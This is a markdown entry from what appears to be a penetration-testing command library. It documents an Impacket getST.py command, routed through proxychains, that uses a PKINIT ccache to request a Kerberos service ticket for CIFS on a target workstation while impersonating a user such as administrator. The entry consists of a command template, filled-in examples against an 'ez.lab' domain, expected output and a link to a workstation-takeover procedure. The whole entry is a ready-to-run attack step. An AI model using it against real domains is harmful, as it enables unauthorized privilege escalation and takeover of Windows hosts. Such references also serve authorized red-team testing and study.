---
type: command
executor: bash
data: >-
  proxychains python3 getST.py -spn cifs/$_TARGET_WORKSTATION.$_DOMAIN
  kerberos+ccache://$_DOMAIN\\$_COMPUTER$:$_CCACHE_FILE@$_TARGET_DC
  $_IMPERSONATE_USER@$_DOMAIN $_TGS_CCACHER -v
tags:
  - kerberos
  - st
  - s4u
platforms:
  - Linux
verified: true
validated: true
---

# getst-for-target-account

## Command

```bash
proxychains python3 getST.py -spn cifs/$_TARGET_WORKSTATION.$_DOMAIN kerberos+ccache://$_DOMAIN\\$_COMPUTER$:$_CCACHE_FILE@$_TARGET_DC $_IMPERSONATE_USER@$_DOMAIN $_TGS_CCACHER -v
```

## Description

Requests a Kerberos service ticket (ST) for accessing a target service (e.g., CIFS) using a ccache from PKINIT, optionally impersonating another user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -spn | Service Principal Name (e.g., cifs/ws2.ez.lab) | Yes |
| kerberos+ccache://... | Ccache URI with principal and DC | Yes |
| $_IMPERSONATE_USER | User to impersonate (e.g., administrator) | No |
| $_DOMAIN | Domain name | Yes |
| $_TGS_CCACHER | Output TGS ccache file | Yes |
| -v | Verbose output | No |
| proxychains | Proxy support | No |

## Examples

### Basic Usage

```bash
proxychains python3 getST.py -spn cifs/ws2.ez.lab kerberos+ccache://ez.lab\ws2$:ws2.ccache@dc1.ez.lab administrator@ez.lab administrator_tgs.ccache -v
```

### Advanced Usage

```bash
proxychains python3 getST.py -spn ldap/dc1.ez.lab kerberos+ccache://... -impersonate admin@ez.lab tgs.ccache
```

## Expected Output

Service ticket for cifs/ws2.ez.lab issued
Saved to administrator_tgs.ccache
Ticket details: krbtgt/EZ.LAB@...

## Related

- [[procedures/Workstation-Takeover-with-RBCD]]
- [[tools/Impacket]]
